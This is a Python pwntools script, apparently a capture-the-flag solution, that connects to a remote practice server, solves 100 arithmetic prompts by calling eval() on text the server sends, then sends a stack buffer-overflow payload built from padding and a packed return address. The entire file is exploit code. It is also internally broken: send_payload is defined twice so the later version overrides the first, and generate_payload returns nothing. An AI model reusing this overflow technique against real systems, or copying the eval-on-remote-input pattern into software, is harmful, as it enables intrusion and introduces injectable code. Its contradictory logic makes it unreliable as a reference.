from pwn import *
import ipdb
import struct
import sys

context.log_level = 'debug'

def conn():
    conn = remote('vuln.stacksmash.io', '1112')
    return conn

def exploit(conn, prompt):
    # all_data = conn.recvall()
    conn.recvline()
    conn.recvline()
    result = conn.recvline()
    # conn.recvuntil(b"i DONT BELIEVE YOU!")
    # result = conn.recvuntil(b"\n")
    # print(conn)
    # conn.sendline(prompt)
    # print(all_data)

    counter = 1
    while True:
        print(f"Operation {counter}: {result}")
        if counter == 101: 
           send_payload(conn) 
        result = calculate(conn, result)
        counter += 1
        print(f"counter: {counter}")

    print(result)
    sys.exit()

def send_payload(conn):
    # conn.recvuntil(b'Congratulations! You solved all 100 problems correctly!\n')
    print('Generating payload')
    payload = generate_payload()
    conn.sendline(payload)

def pack32(number):
    return struct.pack("<I", number)

def generate_payload():
    f = open("./payload", "wb")
    payload = b"A"*32
    payload += b"BBBB"
    payload += pack32(0x080491c4)
    payload += b"DDDD"
    f.write(payload)
    f.close()

def calculate(conn, result):
    expression = result.decode().strip()
    answer = int(eval(expression))
    print(f"answer: {answer}")
    conn.sendline(str(answer).encode())
    response = conn.recvline()
    conn.recvline()
    # ipdb.set_trace()
    result = conn.recvline()
    return result

def send_payload(conn):
    payload = b'A' * 100
    conn.sendline(payload)

def main():
    process = None
    process = conn()
    exploit(process, b"A" * 100)
    # process.interactive()
    process.close()

if __name__ == "__main__":
    main()
